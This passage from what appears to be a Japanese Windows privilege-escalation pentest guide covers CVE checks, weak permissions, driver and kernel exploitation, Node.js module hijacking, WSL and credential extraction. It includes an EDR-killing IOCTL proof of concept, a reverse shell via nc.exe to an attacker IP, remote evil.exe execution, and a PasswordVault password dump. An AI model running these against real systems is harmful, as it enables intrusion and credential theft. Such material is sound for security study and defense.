スケジュールされたタスクの場合は、アクションの [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) と、2 つのサイドカーパスの ACL を確認してください。タスクで作業ディレクトリが指定されていない場合、実行ファイルのディレクトリは確認すべき手掛かりにすぎず、タスクがそこで入力を読み込む証拠にはなりません。プロジェクトの作業ファイルに関する前提条件も満たす必要があります。SYSTEM で実行されると決めつけず、実際のタスクプリンシパルを確認してください。

## アプリケーション

### インストール済みアプリケーション

**バイナリの権限**（上書きして権限昇格できる可能性があります）と、**フォルダーの権限**（[DLL Hijacking](dll-hijacking/index.html)）を確認してください。

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent の修復パス

[CVE-2024-0670](https://checkmk.com/werk/16361) は、`C:\Windows\Temp` にコマンドファイルを書き込み、置き換えに失敗した場合に既存の書き込み保護されたファイルを実行していた、旧バージョンの Checkmk Windows agent に影響します。ベンダーは 2.1.0p40、2.2.0p23、2.3.0b1、2.4.0b1 でこの問題を修正しました。インストール済みの正確な patch level と、影響を受ける agent 操作を実行できるかを確認してください。`2.1` のようなブランチのみのラベルでは、影響の有無を判断できません。列挙では、ファイルを作成したり agent のコマンドを実行したりせずに、バージョン、サービスの状態、Temp のアクセス許可を調べられます。

#### ADSelfService Plus SAML サービスの確認

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) は、ADSelfService Plus build 6210 以前に影響し、ベンダーは build 6211 で修正しました。この問題が関係するのは、SAML SSO が**現在または過去に**有効だった場合のみです。そのため、インストール済み製品の記録やサービスのパスは調査の手がかりであり、脆弱性の判定にはなりません。正確な build、SAML 設定の履歴、サービスへのネットワーク到達性、実行アカウントを確認してください。サービス経由での code execution は、そのアカウントの権限を引き継ぎます。SYSTEM 権限で実行されるのは、サービスのインスタンスが SYSTEM で実行されている場合に限られます。製品の Backup ディレクトリにある読み取り可能な `OfflineBackup_*.ezip` は、別個の暗号化バックアップに関する手がかりであり、利用可能な認証情報やこの SAML の脆弱性を示すものではありません。通常の列挙では展開せずに、そのパスとアクセス権を記録してください。

#### Jenkins コントローラーとドメインアカウントの境界

Windows Jenkins コントローラーでは、job の作成・設定権限と、job の開始権限を区別してください。[Jenkins のドキュメントでは、これらは個別の `Job/Create`、`Job/Configure`、`Job/Build` 権限として定義されています](https://www.jenkins.io/doc/book/security/access-control/permissions/)。設定済みのスケジュールや remote trigger が別の build 経路になる場合もありますが、それが有効で、実際に build が実行されることを確認してください。実行時の ID はコントローラーまたは選択された agent の ID となり、保存された認証情報は job がそのスコープにアクセスできる場合にのみ使用できます。これとは別に、`JENKINS_HOME` のメタデータへのアクセスを確認してください。Jenkins は認証情報のデータと暗号化キーを `credentials.xml`、`secrets/hudson.util.Secret`、`secrets/master.key` に保存します（[Jenkins のシークレットストレージ](https://www.jenkins.io/doc/developer/security/secrets/)）。これらのファイルが存在するだけでは、パスワードが判明したことにはなりません。共有出力にシークレットを表示せずに、**必要なファイルへの読み取りアクセス**と、別個のアカウント再利用経路を確認してください。そのアカウントに AD user-object の `scriptPath` 書き込み権限がある場合、他ユーザーとしての実行と見なす前に、script path に書き込み可能であること、および対象ユーザーとして実行される実際のログオンまたはスケジュールされた実行元があることを確認してください。さらにグループを制御できるかどうかは、実効 AD 権限を個別に確認する必要があります。

#### Azure Pipelines self-hosted agent の実行 ID

Azure DevOps Server または Azure Pipelines の project では、pipeline の**作成または編集**権限と、pipeline の**queue**権限および選択した agent pool の使用権限を区別してください。[Microsoft は pipeline の権限](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops)と [pool の認可](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops)をそれぞれ別個に説明しています。低権限アカウントが script step を送信し、その pipeline を self-hosted Windows agent 上で実行できる場合、その step は[agent に設定された operating-system account](https://learn.microsoft.com/azure/devops/pipelines/agents/agents)として実行されます。他ユーザーまたは SYSTEM への権限移行を主張する前に、対象の pipeline、branch/resource の制限、認可された pool、実行可能な job、agent サービスの実行 ID を確認してください。agent のインストール、project の role、または repository への書き込み権限だけでは、調査の手がかりにすぎません。passive enumeration 中に build を開始せず、権限とローカルのサービスメタデータを確認してください。

#### Microsoft Entra Connect Sync の認証情報

[Microsoft は](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions)、同期サービスを実行して SQL database にアクセスする **ADSync service account** と、ディレクトリ権限が設定済みの同期機能に応じて決まる **AD DS connector account** を区別しています。connector の認証情報はその database に暗号化して保存され、キーのデータは[ADSync service account の下で DPAPI によって保護されます](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account)。同期サービスのインストール、ローカルの管理者を連想させるグループ、または database を参照できることだけでは、復号可能な認証情報やドメイン権限の昇格が確認されたことにはなりません。実際の database 読み取り権限、service account とキーへのアクセス、インストールおよび SQL の構成、設定された connector identity、その identity の実効 AD 権限を個別に確認してください。通常の列挙では、サービスとアクセスのメタデータのみを表示し、保存されたシークレットの query や表示は行わないでください。

#### プリンタードライバーのサポート DLL のアクセス許可

インストール済みのプリンタードライバーは、サポート DLL を `C:\ProgramData` に保存し、より高い権限を持つ印刷プロセスで読み込むことがあります。プリンターの WMI 列挙が拒否される場合でも、親ディレクトリと reparse point を含めて、対象ドライバーの正確なディレクトリと DLL の ACL を確認してください。[Ricoh プリンタードライバーの問題 CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) で報告されたパスは `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` です。[元の公開情報](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/)では、`PrintIsolationHost.exe` による DLL の読み込みが説明されています。ACL で書き込み可能であることは、あくまで調査の手がかりです。deny エントリ適用後の実効書き込み権限、該当ドライバーがインストールされ、特権 ID でそのファイルを読み込むこと、ベンダーの更新済みドライバーまたはセキュリティプログラムによってインストールが修正されているかを確認してください。ディレクトリ名やドライバーのバージョンだけから脆弱性があると判断しないでください。

### 書き込み権限

特別なファイルを読み取れるよう設定ファイルを変更できるか、または Administrator アカウントによって実行されるバイナリ（schedtasks）を変更できるか確認してください。

システム内の権限が弱いフォルダーやファイルを見つけるには、次のようにします。

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoloadによる永続化/実行

Notepad++は`plugins`サブフォルダ内のプラグインDLLを自動ロードします。書き込み可能なポータブル版またはコピー版が存在する場合、悪意のあるプラグインを配置すると、起動のたびに`notepad++.exe`内でコードが自動実行されます（`DllMain`やプラグインのコールバックからも実行されます）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### 起動時に実行

**別のユーザーによって実行されるレジストリやバイナリを上書きできるか確認してください。**\
**次のページを読んで、権限昇格に利用できる興味深いautorunsの場所について詳しく学んでください。**


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ドライバー

**サードパーティ製の不審な/脆弱な**ドライバーを探してください.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

ドライバーが任意の kernel read/write primitive（設計の不適切な IOCTL handler でよく見られるもの）を公開している場合、kernel memory から SYSTEM token を直接盗むことで privilege escalation できます。<sup>[[13]](#references)</sup> 手順はこちらを参照してください:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

脆弱な呼び出しが攻撃者の制御する Object Manager path を開く race-condition bug では、lookup を意図的に遅くする（最大長の component や深い directory chain を使う）ことで、タイミングの余裕をマイクロ秒単位から数十マイクロ秒単位に延ばせます:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue の UAF、paged-pool disclosure、I/O ring pivot

Windows kernel LPE chain の中には、単体では弱い2つの bug を組み合わせて構築できるものがあります。1つは、queue lock を保持したまま request/CBD を解放する **cancel-safe queue lifetime race**、もう1つは、`RtlCopyToUser` 中に解放済みの paged-pool allocation の内容を漏らす **lock-release-before-copy disclosure** です。<sup>[[29]](#references)</sup>

監査と exploit に関するメモ:

- **lock を保持したまま解放し、その後 cancel**: success path が **Acquire -> CompleteRequest/free -> Release** を行い、cancel path が **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** を行う箇所を探してください。success path が CBDQ/CSQ lock を解放する前に `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` に到達すると、`NtCancelIoFileEx -> IopCsqCancelRoutine` でブロックされていた thread が後から再開し、解放済みの `PFLT_CALLBACK_DATA` を driver の remove callback に渡す可能性があります。
- 解放済みの queue object を、同じサイズの攻撃者制御 paged-pool allocation で **再利用**します。`NPFS` Data Queue Entries は payload とサイズを制御でき、後から pipe の read/peek operation で調査できるため有用です。解放済みの object に list link が含まれる場合は、これらを **user memory 内の fake request node の cyclic list** で上書きすると、driver は元の list head で処理を終了せず、攻撃者が定義した request structure を繰り返し処理します。
- **予測可能な write を強化する**: fake request によって、bookkeeping write（timestamp / QPC / refcount に隣接する field）で使われる nested context pointer を変更できる場合、**アドレスは制御できるが値は制御できない** kernel write を得られることがあります。その場合、最終的な code/data pointer ではなく、spray した pool object の **length/size** field を標的にし、破損した object が **out-of-bounds paged-pool read** を返すまで spray 対象を列挙してください。
- **race 可能な disclosure pattern**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` を行う syscall は、いずれも有力な候補です。攻撃者がコピーされる buffer を大きくできる場合（たとえば、serializer の最終 allocation size が増えるように list/resource entry を多数追加するなど）、マシンを crash させずに copy 時間を延ばし、replacement window を広げられるため、成功率が向上します。
- **pointer が多い再利用先**: Windows **I/O ring** の registered-buffer array は、paged-pool のサイズ（`8 * regBufferCnt`）を攻撃者が制御でき、各 element が `_IOP_MC_BUFFER_ENTRY` への kernel pointer であるため、優れた disclosure target です。この array を1つ leak し、周囲の `IORING_OBJECT` を特定したうえで、**`RegBuffers`** と **`RegBuffersCount`** を破損させると、その後の I/O ring operation が攻撃者の偽造した entry を使用し、任意の kernel read/write を実現できます。利用できる write が安定した byte（たとえば `KUSER_SHARED_DATA+0x14` の値）しか与えない場合は、**重複する unaligned write** を使って `0x0101010101010101` のような同一 byte の繰り返しからなる user pointer を構築し、`VirtualAlloc` で map して、偽造した registered-buffer array を配置してください。<sup>[[30]](#references)</sup>

有用な debugging indicator:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

破損した I/O ring から任意のカーネル読み書きを取得したら、標準的な post-primitive workflow を使って SYSTEM token を窃取します。

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive のメモリ破損プリミティブ

最新の hive 脆弱性では、決定論的なレイアウトを groom し、書き込み可能な HKLM/HKU の子キーを悪用して、カスタムドライバーなしでメタデータの破損をカーネル paged-pool overflow に変換できます。完全な攻撃チェーンはこちら：

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### 攻撃者が制御するパスによる `RtlQueryRegistryValues` の direct-mode type confusion

一部のドライバーはユーザーランドからレジストリパスを受け取り、それが妥当な UTF-16 文字列であることだけを検証した後、スタック上の `int readValue` などのスカラー変数に対して `RTL_QUERY_REGISTRY_DIRECT` を指定し、`RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` を呼び出します。`RTL_QUERY_REGISTRY_TYPECHECK` が指定されていない場合、`EntryContext` は開発者が想定した型ではなく、レジストリの**実際の**型に基づいて解釈されます。

これにより、次の2つの有用なプリミティブが得られます：<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: ユーザーが制御する絶対パス `\Registry\...` を使って、ドライバーに攻撃者が選んだキーをクエリさせ、戻り値やログを通じて存在を leak させたり、呼び出し元が直接アクセスできない値を読み取らせたりできる場合があります。
- **カーネルメモリ破損**: `&readValue` のようなスカラー変数への書き込み先は、レジストリ値の型に応じて `REG_QWORD`、`UNICODE_STRING`、またはサイズ指定のバイナリバッファとして type confusion を起こします。

実際の悪用に関する注意点：

- **Windows 8 以降の緩和策**: `RTL_QUERY_REGISTRY_TYPECHECK` を指定せずに `RTL_QUERY_REGISTRY_DIRECT` で**信頼されていない hive** にクエリすると、カーネル呼び出し元で `KERNEL_SECURITY_CHECK_FAILURE (0x139)` が発生します。悪用可能な状態を保つには、`HKCU` 配下に値を用意するのではなく、**信頼されたシステム hive 内の攻撃者が書き込み可能なキー**を探してください。
- **信頼された hive への値の配置**: NtObjectManager を使って `\Registry\Machine` 配下の書き込み可能な子キーを列挙し、複製した**低整合性**トークンでもスキャンを再実行して、サンドボックス環境からアクセス可能なキーを見つけます：<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4-byteの`int`に8バイトを直接書き込むと、隣接するスタックデータが破損し、近くのコールバック／関数ポインターが部分的に上書きされる可能性があります。
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct modeでは、`EntryContext`が`UNICODE_STRING`を指していることを想定します。コードが攻撃者制御の`REG_DWORD`をまずスタックスカラーに読み込み、その同じバッファを文字列の読み込みに再利用すると、攻撃者が`Length`／`MaximumLength`を制御し、`Buffer`ポインターにも部分的に影響を与えるため、半制御のカーネル書き込みが可能になります。
- **`REG_BINARY`**: 大きなバイナリデータの場合、direct modeは`EntryContext`の先頭にある`LONG`を符号付きバッファサイズとして扱います。先行する`REG_DWORD`の読み込みによって、再利用されるスカラーに攻撃者制御の**負の値**が残っていると、次の`REG_BINARY`クエリで攻撃者のバイト列が隣接するスタックスロットに直接コピーされます。これは多くの場合、コールバックポインターを完全に上書きする最も簡単な方法です。

有力な探索パターン: **初期化し直さずに、同じスタック変数へ異なる型のレジストリ値を読み込むこと**。`RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、再利用される`EntryContext`ポインター、および最初のレジストリ読み込みによって2回目の読み込みが実行されるかどうかが決まるコードパスをgrepします。

#### デバイスオブジェクトでのFILE_DEVICE_SECURE_OPEN設定漏れの悪用（LPE + EDR kill）

一部の署名済みサードパーティ製ドライバーは、IoCreateDeviceSecureを使用して強固なSDDLを設定したデバイスオブジェクトを作成する一方で、DeviceCharacteristicsにFILE_DEVICE_SECURE_OPENを設定し忘れます。このフラグがないと、余分なコンポーネントを含むパスからデバイスを開く際にセキュアDACLが適用されず、権限のないユーザーでも次のような名前空間パスを使用してハンドルを取得できます。<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile（実際の事例）

ユーザーがデバイスを開けると、ドライバーが公開する特権IOCTLを悪用して、LPEや改ざんを行える可能性があります。実環境で確認された機能の例:
- 任意のプロセスに対するフルアクセスハンドルの返却（トークン窃取 / DuplicateTokenEx/CreateProcessAsUser経由のSYSTEMシェル）。
- 制限のないraw disk読み書き（オフライン改ざん、ブート時の永続化手法）。
- Protected Process/Light（PP/PPL）を含む任意のプロセスの終了。これにより、カーネル経由でユーザーモードからAV/EDR killが可能になります。

最小限のPoCパターン（ユーザーモード）:
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

開発者向けの緩和策
- DACL によってアクセスを制限するデバイス オブジェクトを作成する場合は、必ず FILE_DEVICE_SECURE_OPEN を設定する。
- 特権操作を行う呼び出し元のコンテキストを検証する。プロセスの終了やハンドルの返却を許可する前に、PP/PPL チェックを追加する。
- IOCTL を制限する（アクセス マスク、METHOD_*、入力検証）。カーネル権限を直接使う代わりに、brokered model の採用も検討する。

防御側向けの検知案
- 不審なデバイス名（例: `\\ .\\amsdk*`）に対するユーザーモードからのオープンや、悪用を示す特定の IOCTL シーケンスを監視する。
- Microsoft の脆弱なドライバーのブロックリスト（HVCI/WDAC/Smart App Control）を適用し、独自の許可リスト／拒否リストも管理する。


## PATH DLL Hijacking

**PATH 上のフォルダー内に書き込み権限**がある場合、プロセスが読み込む DLL を hijack して、**権限昇格**できる可能性があります。<sup>[[2]](#references)</sup>

PATH 内のすべてのフォルダーのアクセス許可を確認します:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

詳細な悪用方法については、こちらを参照してください。


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` を介した Node.js / Electron module resolution hijacking

これは、Node.js と Electron のアプリケーションが `require("foo")` のような bare import を実行した際に、想定されるモジュールが**存在しない**場合に影響する、**Windows uncontrolled search path** の亜種です。<sup>[[20]](#references)</sup>

Node はディレクトリツリーを上方向にたどり、各親ディレクトリの `node_modules` フォルダーを確認してパッケージを解決します。Windows では、この探索がドライブのルートに達することがあるため、`C:\Users\Administrator\project\app.js` から起動したアプリケーションは、次の場所を順に確認する可能性があります。<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**低権限ユーザー**が `C:\node_modules` を作成できる場合、悪意のある `foo.js`（またはパッケージフォルダー）を配置し、**高権限の Node/Electron プロセス**が存在しない依存関係を解決するのを待つことができます。ペイロードは被害プロセスのセキュリティコンテキストで実行されるため、対象が管理者として実行されている場合、昇格されたスケジュールタスクやサービスのラッパーから実行されている場合、または特権を持つデスクトップアプリとして自動起動されている場合、これは **LPE** につながります。

特に、次のような状況でよく見られます。

- 依存関係が `optionalDependencies` に宣言されている<sup>[[22]](#references)</sup>
- サードパーティライブラリが `require("foo")` を `try/catch` で囲み、失敗しても処理を続行する
- パッケージが本番ビルドから削除されている、パッケージ化の際に含まれていない、またはインストールに失敗している
- 脆弱な `require()` がメインのアプリケーションコードではなく、依存関係ツリーの深い場所にある

### 脆弱な対象の調査

**Procmon** を使って解決パスを確認します。<sup>[[23]](#references)</sup>

- `Process Name` = 対象の実行ファイル（`node.exe`、Electron アプリの EXE、またはラッパープロセス）でフィルターする
- `Path` が `node_modules` を `contains` する条件でフィルターする
- `NAME NOT FOUND` と、`C:\node_modules` 配下で最後に成功したオープンに注目する

展開済みの `.asar` ファイルやアプリケーションのソースで確認する、コードレビュー上の有用なパターン：

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon またはソースの確認から**不足しているパッケージ名**を特定します。
2. まだ存在しない場合は、ルートの検索ディレクトリを作成します。

```powershell
mkdir C:\node_modules
```

3. 想定される正確な名前でモジュールを配置する：

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. 被害者のアプリケーションを起動します。アプリケーションが `require("foo")` を試み、正規のモジュールが存在しない場合、Node は `C:\node_modules\foo.js` を読み込む可能性があります。

このパターンに当てはまる、実際に使われている欠落したオプションモジュールの例として、`bluebird` や `utf-8-validate` があります。しかし、再利用可能な部分は**手法**そのものです。特権で実行される Windows の Node/Electron プロセスが解決する、欠落した**bare import**を見つけてください。

### 検出とハードニングのアイデア

- ユーザーによる `C:\node_modules` の作成や、その場所への新しい `.js` ファイル／パッケージの書き込みを検知します。
- 高い整合性レベルで実行されるプロセスが `C:\node_modules\*` から読み込んでいないか調査します。
- 本番環境ではすべてのランタイム依存関係をパッケージ化し、`optionalDependencies` の使用状況を監査します。
- サードパーティーのコードに、エラーを黙って無視する `try { require("...") } catch {}` パターンがないか確認します。
- ライブラリが対応している場合は、オプションのプローブを無効にします（たとえば、一部の `ws` 環境では `WS_NO_UTF_8_VALIDATE=1` を使って旧式の `utf-8-validate` プローブを回避できます）。

## ネットワーク

### 共有

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hostsファイル

hostsファイルにハードコードされている、ほかの既知のコンピューターを確認します。

```
type C:\Windows\System32\drivers\etc\hosts
```

### ネットワークインターフェースとDNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### 開放ポート

外部から**制限対象サービス**を確認する

```bash
netstat -ano #Opened ports?
```

ローカルリスナーについては、PID をプロセスの所有者、実行ファイルのパス、および起動元のサービスやスケジュールされたタスクと照合します。リモートコントロールサービスからデスクトップユーザーとしてアクセスできるのは、その認証およびコマンド制御で許可されている場合に限ります。より高い権限のアカウントで実行されているカスタム TCP アプリケーションは、別途調査すべき対象です。リスナーとバイナリのパスは手掛かりにすぎません。認証後にメモリ破損を引き起こす経路を確認するには、その正確なバイナリと、そこに到達可能な入力を分析する必要があります。公開ポートがシステムプロセスに属しているように見える場合は、バックエンドサービスを特定する前に [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) と照合してください。転送ルールがあるだけでは、転送先に到達可能であることや、脆弱であることの証明にはなりません。

### ルーティングテーブル

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARPテーブル

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### ファイアウォールルール

[**ファイアウォール関連のコマンドはこちらを確認してください**](../basic-cmd-for-pentesters.md#firewall) **（ルールの一覧表示、ルールの作成、無効化、無効化など...）**

ネットワーク列挙用の[コマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

バイナリの `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

rootユーザーを取得すると、任意のポートで listen できます（初めて `nc.exe` でポートを listen するときは、ファイアウォールで `nc` を許可するかどうかを GUI で確認されます）。

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

bash を root として簡単に起動するには、`--default-user root` を試してください。

`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` フォルダーで `WSL` のファイルシステムを確認できます。

WSL 内の Linux の `root` 権限だけでは、Windows の Administrator 権限は得られません。現在の Windows ID でディストリビューションのファイルシステムを読み取れる場合は、認証情報が記録されている可能性のあるコマンドを探すため、`/root/.bash_history` を含むシェル履歴ファイルを確認してください。ただし、権限昇格には、より高い権限を持つ有効なアカウントと、許可された認証経路が引き続き必要です。`LocalState\rootfs` の構成は古い WSL インストールに適用されます。WSL 2 では通常、ディストリビューションは [`ext4.vhdx` 仮想ディスク](https://learn.microsoft.com/en-us/windows/wsl/disk-space)に保存されるため、まず実際のディストリビューションと保存先を特定してください。自動列挙の際は、履歴の内容を出力しないようにしてください。

## Windows Credentials

### Winlogon Credentials

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName` と `DefaultDomainName` は認証情報ではなく、アカウントコンテキストとして扱ってください。空でない `DefaultPassword` または `AltDefaultPassword` の値は、レジストリ内の平文パスワードの検出結果です。`AutoAdminLogon=1` でも平文パスワードを読み取れない場合は、手がかりにとどまります。[Sysinternals Autologon はパスワードを LSA secret として保存することがあります](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon)。通常のレジストリ読み取りだけでは、その secret が存在するか、取得可能かどうかは確認できません。認証情報の露出を報告する前に、アクセス権と実際のログオン設定を確認してください。

### Credentials manager / Windows vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault は、**Windows** が**ユーザーの自動ログイン**に使用できる、サーバー、Webサイト、その他のプログラム用のユーザー認証情報を保存します。最初は、ユーザーが Facebook、Twitter、Gmail などのサイトの認証情報を保存し、ブラウザーに自動ログインさせられるように聞こえるかもしれませんが、そういう仕組みではありません。

Windows Vault は、Windows がユーザーを自動ログインさせるための認証情報を保存します。つまり、リソース（サーバーまたはWebサイト）へのアクセスに認証情報が必要な**Windowsアプリケーション**は、**この Credential Manager と Windows Vault を利用**し、ユーザーが毎回ユーザー名とパスワードを入力する代わりに、保存されている認証情報を使用できます。

アプリケーションが Credential Manager と連携しない限り、特定のリソース用の認証情報を使うことはできないと思います。そのため、アプリケーションで vault を利用する場合は、何らかの方法で**credential manager と通信し、デフォルトのストレージ vault からそのリソース用の認証情報を要求**する必要があります。

`cmdkey` を使って、マシンに保存されている認証情報を一覧表示します。

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

その後、保存された資格情報を使用するには、`/savecred` オプションを指定して `runas` を実行します。次の例では、SMB共有経由でリモートバイナリを呼び出しています。

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

提供された認証情報を使用して`runas`を実行する。

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) を使用することに注意してください。

### UWP PasswordVault / Credential Locker

最新の Windows UWP アプリケーション、Microsoft Edge、および最新のシステムサービスは、認証トークンと平文のパスワードを Universal Windows Platform (UWP) の `PasswordVault`（`vaultcmd` では `Web Credentials` としても公開）内に保存します。このストレージ領域はセッションごとに分離されており、管理者権限や `SeDebugPrivilege` がなくてもネイティブに復号できます。

ユーザーのアクティブなセッション内で次の PowerShell コマンドを実行すると、保存されているすべてのユーザー名と平文パスワードを即座に dump して復号できます。

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** は、データを対称暗号化する方法を提供します。主に Windows オペレーティングシステム内で、非対称秘密鍵の対称暗号化に使用されます。この暗号化では、ユーザーまたはシステムのシークレットを利用して、エントロピーを大幅に高めます。

**DPAPI は、ユーザーのログインシークレットから導出した対称鍵を使って鍵を暗号化します**。システム暗号化の場合は、システムのドメイン認証シークレットを使用します。

